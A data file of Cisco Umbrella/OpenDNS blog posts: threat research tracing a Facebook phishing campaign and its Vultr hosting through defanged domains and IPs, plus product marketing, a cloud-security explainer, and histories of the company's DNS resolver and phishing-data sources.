{"website": "Cisco-Umbrella", "title": "Phishing, Spiking, and Bad Hosting", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/phishing-spiking-and-bad-hosting", "abstract": "At OpenDNS Labs we have developed a number of predictive models to hunt down evil on the Internet. We have discussed in previous blogs and conferences our algorithms NLPRank [1] [2] , Spike detector [3] [4] [5], and malicious IP space/rogue host detectors [6] (section 14) [7] [8] [9] [10] [11] . In this blog we will discuss how we integrate all of these detection models to improve detection coverage of current threats and walk through a few interesting examples. Phishing and Spikes One of the recent samples we have found was a Facebook phishing campaign that was surfaced by our real-time alert system. Our model NLPRank detected the campaign of Facebook phishing sites spoofing Facebook under the second-level domain (2LD) 2nso3s[.]com. For this particular domain, when visiting the 2LD, 2nso3s[.]com from your browser, you would be directed to a URL that looks like: http://facebook[.]com.accounts[.]login[.]userid[.]280964[.]2nso3s[.]com/wec/fbn/?next=http%3A%2F%2Fwww.facebook.com%2videos%2F%3A%4A%4ID%1A As we can see in the path of the URL the next page routes you directly to the legitimate facebook[.]com after they have stolen the entered credentials. We also cross referenced this domain with our crowd-sourced system Phishtank, and found someone from the community submitted one of these hostnames. Something to take note of here is that upon each subsequent request to the same FQDN, the third-level domain (3LD) appears to be rotating integers (indicative of fluxing domain name). Rotating subdomains is a technique similar to what Careto, also known as The Mask, malware uses. Here are some samples from Careto: paypal.com[.]0[.]security-confirmation[.]9f15ebd9884fb6a44f873d4bdf41aebc.hvh7[.]hyd[.]me www[.]paypal.com[.]0[.]login-confirmation.account-security[.]979e0a277a1848104c3ee6b4bc928152.231[.]hyd[.]me www[.]paypal[.]com[.]confirmation[.]account-security[.]dbf2b36a883bddda923a341409e6b8abdbf2b36a883bddda923a341409e6b[.]wsedw[.]hyd[.]me paypal[.]com[.]0[.]security-confirmation[.]fc1618c9ae39989770371191790a772b[.]er44.hyd[.]me This domain hyd[.]me exhibits steady high volume traffic. In fact, it is a sinkholed domain by Kleissner & Associates, which has been acquired by LookingGlass . Going back to our initial 2LD 2nso3s[.]com serving the Facebook phishing urls, what is also interesting is the massive traffic spike, which is typically uncharacteristic of phishing domains. Here is the traffic pattern for 2nso3s[.]com: Figure 1 Visiting the domain in the browser shows that it is spoofing the Facebook login page: Figure 3a: Figure 3b: Figure 3c: One can see from the above screenshots that the 3LD in the FQDN is rotating, this happens over tens of thousands of queries. Figure 4 shows another interesting catch exhibiting similar characteristics detected by the Spike and NLPRank models, ebayonline[.]cc: Figure 4 This sample one is also rotating through subdomains: seo28. ebayonline[ .] cc seo115. ebayonline[ .] cc seo159. ebayonline[ .] cc Here is another sample of a spoofed brand domain that exhibits features detected by the 2 models, analytics-google[.]com: Figure 5 There are a lot of variations spoofing google-analytics, however they have much smaller request rate. For example, Figure 6 displays traffic from google–analytics[.]com: Figure 6 As we can see this spoofing domain has much lower traffic counts, which is more typical of phishing domains. Here is an example of a PayPal phish, mpaypaal[.]com, also exhibiting a low query count: When viewing the page we see the attacker copying the login for the original PayPal site and phishing for credentials: Investigate and Visualization Going back to 2nso3s[.]com, data visualization and Investigate can provide some further interesting insights into this domain. First of all, we can use our “Life of a Domain” visualization in order to get a better representation of the domain lifetime and all its key events. Let’s have a look: We can see a couple of things. The two blue dots represent the domain registration and we can see here that our domain was registered pretty recently (mid-August 2015) and is scheduled to expire the following year. On this specific visualization, we typically see a couple of red circles showing when the domain was tagged/flagged by our analysts, which wasn’t the case here. (Of course, now it’s all blocked). We can also see that our domain was registered with an address in Mexico. Interestingly, the client traffic comes mainly from the US, Russia, France, and the UK. We have the phone number and an email address, which allows us to dig deeper in our investigation. From the email address “mireyadreedjs@yahoo.com” and using the Investigate data, we can search our WHOIS database to discover which other domains were registered by the same account : 2nso3s[.]com 2nsoe93[.]com 32nos35[.]com 34scw3[.]com 34swe2[.]com 3sn39s[.]com 3snose4[.]com an340sm[.]com dv324do[.]com 23oens9[.]com 23ud82[.]com 349sln2[.]com 3skd93[.]com From these domains, we can keep mining and discover subdomains, attached URLs, IP addresses, and even hashes of the malware hosted on these servers. We can then use all this correlating data and build a map of the full infrastructure of the phishing campaign. All of this operated very simply using our homemade data miner script (more about that in a later blog), and we can visualize the result in 3D with OpenGraphiti. Once we’ve extracted and visualized all of these new candidates, we can use another interesting visualization called “Parallel Coordinates.” The idea is to represent the features of our candidates stacked all together in a graph representation. The horizontal axis represent the set of features of our vector (pictured here we have Investigate + VirusTotal features), the vertical one represents the values of those features taken by our vectors. See below : Considering that this simple diagram is displaying 100 domains at the same time, we can instantly guess at first sight that they have a lot in common given the small distance between all the curves. We can see that these domains have a low popularity, which means those domains have seen a small amount of traffic. They have only been created about 10 days ago (the age axis is on a log scale), mapping to only one IP, one prefix, one ASN, and in only one country. They have a constant TTL set to a very high interval, about 90,000 seconds (TTL standard deviation is zero). The geographical distance between their IPs are small, which is expected since they have only one. The entropy of the domains is pretty high due to the DGA part of the name. The status is -1 for all of these, meaning that OpenDNS is actively blocking all of them at the moment. And finall,y they have 10 or more URLs that have been flagged on VirusTotal. Dissecting hosting IP space We can use our malicious IP space/rogue host monitoring models to investigate the hosting IP infrastructure of the 13 2LDs registered by mireyadreedjs@yahoo.com. These 2LDs are all hosted on IPs that are part of AS20473, AS-CHOOPA – Choopa, LLC 86400, but more specifically they are all under the hoster Vultr , which is a child company of Choopa, LLC . Vultr is more or less a DigitalOcean clone trying to compete with it in the affordable VPS market. Vultr’s IP space spans more than 65,000 IPs located in North America, Europe, and Asia/Pacific. Its cost-effectiveness, however, made it an attractive platform for criminals to host exploit kit domains, phishing, and other gray content. In the table below, for reference, we show all the phishing 2LDs with their corresponding IPs, prefixes, ASNs, and specific hoster, as well as the total number of phishing hostnames we recorded in relation to the IPs and a link to all hostnames on the IPs. 2LD IP prefix ASN hoster # of host-names on IP hostnames 3sn39s.com 104.156.254.188 104.156.254.0/23 20473 Vultr 3 list of domains 32nos35.com 104.156.255.253 104.156.254.0/23 20473 Vultr 452 list of domains dv324do.com 104.156.255.91 104.156.254.0/23 20473 Vultr 197 list of domains 349sln2.com 349sln2.com 104.207.156.185 104.207.156.0/22 20473 Vultr 101 list of domains 2nso3s.com 34swe2.com 104.238.179.129 104.238.178.0/23 20473 Vultr 2896 list of domains 2nsoe93.com 34scw3.com 108.61.215.91 108.61.215.0/24 20473 Vultr 91 list of domains 23oens9.com 23ud82.com 45.63.59.217 45.63.48.0/20 20473 Vultr 168 list of domains Vultr has been under our radar for quite some time as we’ve been monitoring its IP space in the past few months and flagged it as hosting, among other things, exploit kit domains and exploit kit nameservers, particularly Nuclear EK. In the table below, we share a sample of IPs on Vultr that we flagged in the past six months as hosting Nuclear EK landing domains. IP prefix ASN hoster 104.207.131.131 104.207.130.0/23 20473 Vultr 104.238.158.135 104.238.158.0/23 20473 Vultr 104.238.159.114 104.238.158.0/23 20473 Vultr 104.238.159.118 104.238.158.0/23 20473 Vultr 104.238.159.31 104.238.158.0/23 20473 Vultr 107.191.46.115 107.191.46.0/23 20473 Vultr 107.191.46.15 107.191.46.0/23 20473 Vultr 107.191.46.249 107.191.46.0/23 20473 Vultr 107.191.47.17 107.191.46.0/23 20473 Vultr 107.191.47.188 107.191.46.0/23 20473 Vultr 107.191.62.196 107.191.46.0/23 20473 Vultr 107.191.63.163 107.191.62.0/23 20473 Vultr 108.61.164.234 108.61.164.0/22 20473 Vultr 108.61.165.127 108.61.164.0/22 20473 Vultr 108.61.165.40 108.61.164.0/22 20473 Vultr 108.61.165.65 108.61.164.0/22 20473 Vultr 108.61.166.110 108.61.164.0/22 20473 Vultr 108.61.166.137 108.61.164.0/22 20473 Vultr 108.61.167.124 108.61.164.0/22 20473 Vultr 108.61.167.233 108.61.164.0/22 20473 Vultr 108.61.167.3 108.61.164.0/22 20473 Vultr 108.61.171.167 108.61.170.0/23 20473 Vultr 108.61.173.10 108.61.172.0/22 20473 Vultr 108.61.175.63 108.61.172.0/22 20473 Vultr 108.61.176.162 108.61.176.0/23 20473 Vultr 108.61.177.116 108.61.176.0/23 20473 Vultr 108.61.178.17 108.61.178.0/23 20473 Vultr 108.61.188.117 108.61.188.0/23 20473 Vultr 108.61.188.192 108.61.188.0/23 20473 Vultr 108.61.188.213 108.61.188.0/23 20473 Vultr 108.61.188.92 108.61.188.0/23 20473 Vultr 108.61.189.1 108.61.188.0/23 20473 Vultr 108.61.190.120 108.61.190.0/24 20473 Vultr 108.61.190.132 108.61.190.0/24 20473 Vultr 108.61.190.230 108.61.190.0/24 20473 Vultr 108.61.198.45 108.61.198.0/23 20473 Vultr 108.61.208.247 108.61.208.0/23 20473 Vultr 185.92.220.196 185.92.220.0/23 20473 Vultr 185.92.223.3 185.92.222.0/23 20473 Vultr 45.32.232.130 45.32.232.0/21 20473 Vultr 45.32.239.106 45.32.232.0/21 20473 Vultr 45.32.239.163 45.32.232.0/21 20473 Vultr 45.32.239.216 45.32.232.0/21 20473 Vultr 45.32.239.61 45.32.232.0/21 20473 Vultr Takeaways In conclusion, first, it is apparent from these findings that the integration of multiple models enhances our coverage and increases our detection rate. Combining NLPRank, Spike Detection, and the IP monitoring models provides a method to surface large-scale phishing campaigns and automatically block them in real time. Second, bulletproof or abused hosting providers persistently cater to a diversity of “badness” whether it is phishing, exploit kits, malware, or gray content in general. Our global visibility into the attack surface comes in handy to consistently monitor and rapidly catch these threats from different angles. If you’d like to learn more about our research related to these topics, we will be presenting in October at BruCon and Hack.lu . “Unified DNS View to Track Threats” , Dhia Mahjoub and Thomas Mathew, at BruCon “A Collective View of Current Trends in Criminal Hosting Infrastructures” , Dhia Mahjoub, at Hack.lu", "date": "2015-09-14"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella meets cloud network security challenges", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-meets-cloud-network-security-challenges", "abstract": "IT, network operations, and security operations teams are being called to do more to secure the organization while also delivering information and services to an increasingly distributed and ever-expanding edge. To keep your teams and organization protected, you need a way to simplify your cybersecurity stack while evolving it to meet today’s needs and your unique challenges. Whether you’re a security admin supporting a single location or an IT team securing a slew of branches and remote workers, Cisco Umbrella helps deliver the deep inspection and control you need to provide effective threat protection no matter what your use case. Here’s how five different organizations improved their security posture with Cisco Umbrella alongside other Cisco security solutions. Axcess reduces exposure while responding faster With an expanding network perimeter, Axcess needed more than the traditional on-premises security stack to see and protect every location and device. By Introducing Cisco Umbrella into their stack along with Cisco Advanced Malware Protection (AMP) for Endpoints , Axcess has been able to dramatically reduce user exposure to malware. They’ve done this while improving their ability to detect, respond to, and remediate threats when necessary. Also, with Umbrella Investigate — interactive threat intelligence delivered via web console or API — security teams like those at Axcess can move away from simply reacting to incidents and begin proactively discovering and probing threats before they become attacks. With Umbrella and AMP for Endpoints, Axcess Financial was able to: Reduce malware and ransomware by 75% Reduce detection time from weeks (or months) to hours Cut remediation time by 99% Cianbro secures construction teams wherever they work and roam Cianbro, a leading construction firm, had to solve a complex problem: securing a large remote and roaming workforce across offices and worksites. A distributed network of mobile users presents a unique challenge to IT teams: How can you provide these users with the same level of security outside the network as in it — without increasing complexity or throttling performance? By proactively blocking attacks, Umbrella helps Cianbro users to connect securely and confidently when working from laptops off the VPN, mobile devices, or on public Wi-Fi — all while ensuring performance at the same speeds workers have come to expect. Avril gains secure internet access from the cloud Avril — a French agro-industrial group — was looking to provide branch offices with a reliable security solution that could continue to expand as Avril acquired new businesses and divisions. To secure these locations while still providing them with fast direct internet access (DIA), they needed a cloud-delivered security service that could work at the outer edges of the network, providing a front line of protection. Leveraging DNS-layer security to extend protection everywhere, Avril has been able to substantially reduce the risk of data exfiltration and malware across all ports and protocols. Simple to deploy and easy to manage from the cloud, Umbrella also allows Avril to keep expanding protection to keep up with new needs and new growth. Yelp simplifies security, reduces noise, speeds response Investigating and responding to incidents requires a massive simplification and consolidation of security systems. By offering robust threat intelligence as both a web console and API, Cisco Umbrella Investigate helps incident response teams identify and respond to attacks, mitigate damage, and deliver proactive protection for the future by easily integrating with all of your other systems and Cisco security architecture. Yelp wanted to speed the process by which they found and investigated threats, which meant dramatically simplifying the way they work with their security solutions. Using Umbrella, they were able to reduce the complexity, alerts, and noise from different security systems. In the process, Yelp was able to decrease incident response time from days to minutes. Eurofins sees what’s happening, knows the risk in cloud apps Cloud-based apps have become quite popular because of their ease and light OpEx budget footprints. Unfortunately, they are often downloaded and used without being properly vetted by IT. Non-compliant with company security policies, much of this shadow IT has security vulnerabilities that can expose the network to attackers. Eurofins chose Cisco Umbrella to help them efficiently and reliably secure users, protect data, and ensure that potentially perilous apps could not slip in under the radar. With complete visibility across the company’s network, devices, and apps, the Eurofins team was able to identify thousands of apps in use by employees. Associating each of these apps with a risk score, Umbrella gave Eurofins the ability to drill down further into granular details like site registration and the location from which DNS requests were triggered. Making it easier to secure users wherever they work Uniting your entire security stack, Cisco Umbrella simplifies these point solutions into a single cloud-delivered service that’s easy to deploy, configure, and manage — saving you time and resources. Umbrella’s simple, powerful integrations across the Cisco security ecosystem enable you to quickly protect your users wherever they access the internet. You can read more about these stories in our ebook Top 5 Use Cases for Cisco Umbrella . Or, if you’re ready to get started with Cisco Umbrella, register to attend an upcoming live demo where you can ask our security experts all of your questions.", "date": "2020-08-25"},
{"website": "Cisco-Umbrella", "title": "What is Cloud Security?", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/what-is-cloud-security", "abstract": "In this series of educational posts, we’ll demystify some common terminology used in the cybersecurity world, starting with one of the most basic questions: what is cloud security? Cloud security is a subcategory of cybersecurity. It is a broad term that can include security policies, technologies, applications, and controls that are used to protect sensitive company and user data wherever it is exposed in a public, private, or hybrid cloud environment. Like many technical terms, cloud security (and “the cloud”) can mean different things to different people. In some cases, the general term “cloud security” might refer to the tools and practices used to provide web application security for cloud-based applications, or it could refer to securing an organization’s access to the cloud — what is referred to as a “cloud access security broker” (CASB). At Cisco Umbrella, we use the term “cloud security” to describe our cloud-delivered Security-as-a-Service (SaaS, or, to prevent confusion with software-as-a-service: SECaaS). Umbrella delivers the functionality of an on-premises security stack from the cloud, anywhere it is needed, without the need for on-premises security appliances. This type of cybersecurity is ideal for organizations of any size that have cloud-based infrastructure, multiple offices, remote and roaming users, or company data stored in cloud applications. OK, so what is cloud-delivered security? Cloud-delivered security provides users with protection from persistent online threats like malware and ransomware. As more companies move to using cloud infrastructure, the attack surface increases exponentially, and there are many more opportunities for sensitive data to be compromised by attacks. Users are also more vulnerable to attacks due to the increasing popularity of cloud applications, as well as direct internet access (DIA) for remote and roaming users who bypass the safety of the VPN. In the on-premises world, the initial setup of an office requires large capital expenses for a new data center, as well as continual hardware upgrades for on-premises hardware as the company grows. Along with acquiring and provisioning new hardware, the on-premises security stack needs to be built, maintained, and continually monitored by cybersecurity experts — all of which can cost a lot of money! With cloud infrastructure, companies can avoid a huge initial budget outlay when opening a new office. Rather than purchasing and running their own hardware, companies can subscribe to cloud computing resources and pay based on usage. Using cloud-based security may also reduce the need for a team of on-site security experts. Cloud-delivered security services provide continuous protection without the need for downtime or manual patches and updates. Security databases are constantly being updated to provide up-to-date security coverage. You can also deploy cloud security more quickly than traditional on-premises network security. Since user and policy management and network monitoring are performed in the cloud, provisioning can be done more quickly. Instead of having separate security infrastructures for different layers, cloud security combines all elements and data in one place. The Cloud Security Alliance (CSA) is an organization that is dedicated to defining and raising awareness of best practices in cloud security. The CSA has defined the following categories of cloud-delivered Security-as-a-Service products: Business Continuity and Disaster Recovery (BCDR or BC/DR) Continuous Monitoring Data Loss Prevention (DLP) Email Security Encryption Identity and Access Management (IAM) Intrusion Management Network Security Security Assessment Security Information and Event Management (SIEM) Vulnerability Scanning Web Security Cisco Umbrella, leading the way in cloudsecurity Cisco Umbrella unifies multiple security services in a single cloud platform to secure access to the internet and control cloud app usage anywhere users go. It integrates secure web gateway, cloud-delivered firewall, DNS-layer security, and cloud access security broker (CASB) functionality for the most effective protection against sophisticated threats. Cisco Umbrella uses Anycast routing, which allows our 30+ global data centers to identify themselves with the same IP address. This ensures that your internet traffic has the shortest possible journey to and from Umbrella based on network topography and where your device is located, which means no added latency. Umbrella also securely encrypts your traffic. We update Umbrella’s threat monitoring and interactive intelligence continually with data from Cisco Talos, one of the largest commercial threat intelligence teams in the world comprised of world-class researchers, analysts, and engineers. Your users will be protected everywhere and stay productive, too. Interested in learning more? Check out our website for more information about how Cisco Umbrella delivers security to your users from the cloud.", "date": "2020-01-21"},
{"website": "Cisco-Umbrella", "title": "How to secure your remote employees with Cisco Umbrella and AnyConnect", "author": ["David Gormley"], "link": "https://umbrella.cisco.com/blog/how-to-secure-your-remote-employees-with-cisco-umbrella-and-anyconnect", "abstract": "The number of remote and roaming employees has been steadily on the rise for the last few years. But today, there are now millions of new people that are being forced to work from home. Luckily, most business tasks can be done on the internet with the proliferation of SaaS solutions on the market. So, problem solved, right? Well, not exactly. What about security? In a recent Enterprise Strategy Group ( ESG ) research survey, they found that most successful attacks involved a remote or roaming user. “68% of the targeted attacks in the last twelve months compromised a remote or roaming user” Remote and Roaming User Security Requirements, ESG, 2019 So, attackers were already targeting this weak point in security before the massive influx of new remote workers. What do you think is going to happen now? There is a strong need to secure all this new remote web traffic and to do it quickly and efficiently. In the past, many organizations used to set up a proxy appliance at headquarters and backhaul all the remote traffic to that centralized point to perform web security. Not only is this practice expensive and outdated, but it also takes a lot of time to set up and configure. What’s needed now is a cloud-delivered solution that can easily scale to cover the influx of new remote users and provide the security necessary to protect modern web traffic. Last year, Cisco Umbrella released a cloud-native secure web gateway (SWG) which provides a broad set of web traffic control and security (and works with both Cisco and third-party VPNs). It includes antivirus and malware scanning, sandboxing, content and file type controls, application visibility and control, HTTPS/SSL decryption, and full URL level reporting. SWG capabilities are available as part of the Umbrella SIG Essentials Package , along with firewall, DNS-layer security, cloud access security broker (CASB) functionality, and interactive threat intelligence in one cloud-delivered solution. So now there’s a powerful and scalable way to secure your remote and roaming user web traffic. But how do you get that traffic to the cloud service? That’s where the Cisco AnyConnect client fits in. In January, Cisco released a new version of the AnyConnect client that is fully integrated with the Umbrella SWG. Existing AnyConnect customers can simply update their client and connect it to a new or existing Umbrella SIG Essentials account to get the full advantages of a web proxy in the cloud. New Umbrella customers can simply sign up for an Umbrella account and choose the SIG Essentials package to get SWG functionality. Once Umbrella has been deployed in the environment, just deploy the included AnyConnect clients to remote endpoints to gain the benefits. Some of the key benefits of this solution are highlighted by recent world events. The Umbrella service is powered by an elastic infrastructure that can expand to cover new users quickly with no need for new hardware or manual on-premises deployment tasks. You get full visibility across all your web users to enforce acceptable use policies and compliance regulations as well as detect and block millions of attacks. It’s time to embrace the new reality of remote workers and enable your organization to provide secure internet access from anywhere. For more information visit: umbrella.cisco.com/products/secure-web-gateway", "date": "2020-05-05"},
{"website": "Cisco-Umbrella", "title": "Cisco’s integrated security portfolio for cloud, email, and network simplifies and secures more", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/cisco-integrated-security-portfolio-for-cloud-email-and-network-simplifies-and-secures-more", "abstract": "It’s a pervasive fact of life these days that, while your employees, your customers, and your data may be everywhere, your cybersecurity operations team simply can’t do the same. The pervasive use of SaaS applications, an increasingly remote and roaming workforce, and continued network security transformation fueled by SD-WAN are changing the way we work, adding complexity and visibility challenges to an organization’s security architecture and approach. At a time when the demands upon your network are multiplying, IT and cybersecurity operations professionals are seeking new strategies to cope with mounting security challenges. Addressing these challenges comes down to a three-step process of: Simplification Gaining visibility Protecting devices whether on or off corporate networks Because the bulk of attacks start through email 1 , use DNS in attacks 2 , and target endpoints, Cisco embraces simplification, visibility, and ubiquitous protection through an integrated approach to security solutions. Cisco Email Security Cisco Email Security provides defense against email cyberthreats and protects sensitive outbound data. Cisco Umbrella Cisco Umbrella DNS-layer security provides a first line of defense against threats wherever users access the internet — on or off the corporate network — by stopping attacks before a connection is made. Cisco Advanced Malware Protection (AMP) for Endpoints Cisco Advanced Malware Protection (AMP) for Endpoints continually analyzes file activity across your extended network. This allows you to quickly detect, contain, and remove malware on your connected devices. Cisco SecureX Cisco SecureX is the unifying force powering the Cisco integrated security architecture. It connects Cisco’s integrated security portfolio to your existing infrastructure for a consistent experience that unifies visibility, enables automation, and strengthens your security across network, endpoints, cloud, and applications. The integrated power of Cisco Umbrella, Cisco Email Security, and Cisco Advanced Malware Protection for Endpoints, together with Cisco SecureX, is designed to simplify your operations, make threats more visible, and automate device protection regardless of location. It unleashes the full power of our cloud-based portfolio, thereby making your SOC operations more efficient and effective. Incremental change can take you only so far. It’s time to think bigger. Focusing on the three primary areas of vulnerability — email, endpoints, and internet — brings focus to your enterprise security strategy. Learn more about how to simplify, improve visibility of threats, and ubiquitous device protection by reading our ebook here . 1 2018 Verizon Enterprises’ Annual Data Breach Investigations Report (DBIR) 2 Cisco Security Research Report", "date": "2020-08-11"},
{"website": "Cisco-Umbrella", "title": "Cisco Security Report: Majority of Orgs Do Not Monitor DNS", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/cisco-security-report-more-orgs-should-be-monitoring-dns", "abstract": "Cisco’s annual security report released this week, covering everything from threat intelligence, aging infrastructure, geopolitical Internet governance, outsourcing security, and many other topics. The comprehensive report is a view of the security landscape, including results from a large survey that aims to take the pulse of infosec organizations and how they are spending budget and tackling their security challenges. A portion of the report is dedicated to how important it is for organizations to monitor DNS for attack indicators, though a good majority do not do so. In July 2014, OpenDNS Security Labs conducted an informal survey to find out how many companies were monitoring recursive DNS, and the results were not positive. Nearly 67 percent of responders indicated they do not monitor recursive DNS for malicious traffic. The same year, the Verizon Data Breach Investigations report called DNS one of the most valuable sources of data within an organization, recommending that it be mined regularly and cross-referenced against threat intelligence. Cisco Cloud Security Research Lead Dan Hubbard said security teams that are not monitoring DNS for indications of compromise are missing an opportunity. “Aside from routing protocols, DNS is the lowest layer of the Internet,” Hubbard said. “And because it’s so robust and reliable, criminals use it too.” According to the Cisco report, more than 91 percent of attacks use DNS in some way, either to communicate with a control servers, exfiltrate data from targets, or receive new commands to infiltrate networks further. Hubbard said to get that figure for the report, his research team analyzed six months’ worth of known malware signatures from Threat Grid’s intelligence data, detonated the attacks in a sandbox, and observed which attacks used DNS to communicate. “Most organizations have systems that sit above the DNS layer, like secure web gateways and firewalls,” he said. “But soon, your car, your heart rate monitor, your refrigerator, are all going to use DNS. It’s the most pervasive protocol.” The Cisco security report notes that many organizations may not monitor DNS because security and DNS are often managed by two different teams. And while that may be true, Hubbard thinks it’s also a matter of prioritization. The dependability and simplicity of DNS can turn it into an organization’s security blind spot. To read the rest of the report, visit Cisco’s security portal . For more discussion about the DNS security blind spot, see the webcast with Dan Hubbard here .", "date": "2016-01-21"},
{"website": "Cisco-Umbrella", "title": "A Brief History of opendnscache", "author": ["Brian Hartvigsen"], "link": "https://umbrella.cisco.com/blog/a-brief-history-of-opendnscache", "abstract": "With the recent discovery by CloudFlare of the ability to exploit CVE-2015-7547 (the glibc vulnerability ) via dnscache, we thought it was a good time to talk about the history of our DNS resolver: opendnscache. Nine years ago, at the birth of OpenDNS, we started by forking dnscache from the djbdns suite by Daniel J. Bernstein (aka djb). At that time, and to this day — in our opinion — djbdns has long been one of the most secure and reliable DNS suites out there. In 2004 it was the second-most popular DNS server, and is still in use by many companies, including Facebook and OpenDNS, for authoritative DNS service. The code base is approachable and runs on most anything with a C compiler (a joke from our team: if you want to run a DNS server on your toaster or coffee pot , djbdns is the way to go). That said, nine years is a long time, and in that time we have made thousands of modifications to dnscache, averaging a commit a day to main. These commits introduced many features not found in dnscache, such as CacheCheck , category filtering , IPv6 support , and even modifications to how dnscache handles TCP connections. This doesn’t count the number of RFC’s and drafts, like the Global Internet Speedup effort, for which we have added support. We have worked hard, adapting to changing DNS and Internet landscapes. These days it’s hard to look at opendnscache and see djb’s dnscache. Much like Dorothy in Oz, someone expecting to see dnscache when looking at our code base will have the “ We’re not in Kansas anymore ” feeling. The ideas are still there, and we take to heart the way that djb wrote his software — security is the most important aspect of what we do. There are still places where djb shines through, but opendnscache is uniquely ours. We are proud to be based on dnscache. As stated in our comment on the CloudFlare blog, the specific functionality that can lead to exploiting the glibc vulnerability had already been modified. We simply don’t handle TCP the same way the dnscache does. We did our own testing and spent time with Jaime Cochran from the CloudFlare team, investigating new and different potential attack scenarios to make sure we were covered. We are thankful to the CloudFlare team for their willingness to work with us to ensure a great Internet experience for all of our users! We’ll continue to monitor the situation surrounding the glibc vulnerability and update you on any new discoveries we find.", "date": "2016-02-29"},
{"website": "Cisco-Umbrella", "title": "How OpenDNS learns about phishing sites", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/opendns-phishing-sites", "abstract": "Phishing prevention is not a “fire and forget” task. You have to make sure you have great data, double-check the information, and update the data to avoid “false positives.” And you have to do it all the time. Different folks have wondered publicly where our phishing data comes from and how OpenDNS uses the data. This post helps answer those questions, and more. Phishing protection is a significant benefit to customers but it’s also a notable responsibility — under no circumstances does OpenDNS want to disrupt its customers’ normal Internet usage. Note: if you just want speedy, reliable DNS without any protection from phishing, it’s available. (Not recommended, but available.) Use the OpenDNS preferences. With that background out of the way, let me share what we added to our Frequently Asked Questions earlier this week. How does OpenDNS decide if a site is a phishing site? Currently, OpenDNS uses two methods for determining if a site is a phishing site: Analysis of our network data, based on years of experience with DNS traffic. Feeds from several network operators and others working against “Internet Bad Guys.” There are three providers that we may identify and thank publicly for their participation: Support Intelligence Team Cymru CastleCops PIRT How do I report a phishing site to OpenDNS? The fight against phishing isn’t just for the banks and big companies to tackle; you can help. Right now [July, 2006], we encourage submission of possible phishing sites via our contact form. Nothing will be blocked unless it’s verified. How do I tell OpenDNS about a mistakenly-blocked site? Every time OpenDNS shows the phish-blocked page, we offer the option to tell us to review the site. These requests are treated with urgency; we understand that false positives are painful, too. Sites which are removed from the phishing list will be available to OpenDNS customers within one hour after review, and hopefully much sooner. An extra detail: for the data from outside partners, we update our lists every six hours, including removing sites which no longer appear in the feeds. PhishTank PhishTank is a site OpenDNS will launch later this summer as a collaborative clearing house for data and information about phishing and malware on the Internet. PhishTank will be a free community site for validating and sharing this kind of data. There will be various statistics and an API, so anyone else who needs solid data to help fight Internet Bad Guys can use PhishTank as a source. The point? The fight against phishing isn’t just for the banks and big companies to tackle; you can help. Several of you have sent us phishing URLs to add to our lists already — thank you! OpenDNS is selfishly interested in having the best, most up-to-date data available, but we don’t believe that proprietary data in this area is the answer: the API will be open to others, whether they contribute or not. Too often now, phish reports go into a black hole where no response comes back and none of the aggregated intelligence is shared. PhishTank will be a solution to that problem. Next steps Yesterday, we were offered another validated feed of sites to avoid. Thanks! This looks to be a great additional resource, and once it’s confirmed and integrated, we’ll announce it here (with permission). If you have data that will help us block the “Internet Bad Guys” from OpenDNS customers, please let me know. p.s. As noted above, here are two blogs which took a look at OpenDNS right as we launched and wondered aloud about our phishing protection. Another thing OpenDNS should work on ASAP is transparency. I’d really like to know the false positive rate on phishing sites. How many legitimate sites get flagged as a phishing site? (Tyler Longren, July 10, 2006) Tyler, too early to have that specific stat, yet, but we hear you. It looks like they are using blocklists to stop you from hitting known phishing sites. They don’t say where the list comes from or how ofter it is updated. (Mike Frank, July 11, 2006) Mike, thanks for pushing us.", "date": "2006-07-24"},
{"website": "Cisco-Umbrella", "title": "It’s 10 p.m. Do you know what your networked devices are doing?", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/its-10-pm-do-you-know-what-your-networked-devices-are-doing", "abstract": "In the days before pandemic struck, cybersecurity teams were already deep into adapting security controls to an expanding and disappearing perimeter. But now that employees, partners, and contractors have scattered to home offices, kitchen tables, basements, and garages, the challenge is to help keep them secure in a world beyond corporate walls. As the average organization deals with thousands of connected devices all using direct internet access, often times bypassing web filtering and VPN controls completely, it’s difficult to see security threats before they infect hosts and block them before they become embedded command-and-control attacks. Simply put, all your assets are exposed on the internet to a host of malware, phishing, botnets, and other malicious activity. More than 91% of malware uses DNS to gain command and control, exfiltrate data, or redirect web traffic. There’s an easy way to get ahead of the risks and gain visibility across all your connected devices by using the internet’s own infrastructure to stop threats across all ports and protocols. Powered by predictive intelligence, Cisco Umbrella effectively stops malware before it reaches your endpoints or network. Using statistical and machine-learning models to uncover both known and emerging threats, Umbrella proactively blocks connections to malicious destinations at the DNS and IP layers. Cisco Umbrella offers multiple security functions in a single cloud service to secure internet access and control cloud app usage from the network, branch offices, and users at the edge. Umbrella integrates secure web gateway, cloud-delivered firewall, DNS-layer security, and cloud access security broker (CASB) functionality for the most effective protection against threats. This translates into confidence that security operations can continue securely and that threats will be mitigated completely and with less effort. “Cisco Umbrella has lowered overall response time to issues. We are able to glean the data quickly and respond faster which allows the businesses to return to normal operations faster.” Matt Cross, IT Architect, Heartland Business Systems The source for that confidence is due, in part, to Umbrella’s function as a secure onramp to the internet, delivering deep inspection and control to support compliance and block threats. Cisco Talos, one of the largest threat intelligence teams in the world, supports Umbrella’s proactive visibility and response capabilities. Talos provides interactive access to threat intelligence to aid in incident response and threat research. Every day, Umbrella analyzes 200 billion internet requests, and 60,000+ new destinations are added to our block list. Cisco Umbrella delivers the most secure, most reliable, and fastest internet experience to more than 20,000 customers. As a leading provider of network security and recursive DNS security, we enable the world to connect to the internet on any device with confidence. With a free trial of Cisco Umbrella DNS-layer security, you can start protecting in minutes. Why not check it out for 14 days for free ?", "date": "2020-08-04"},
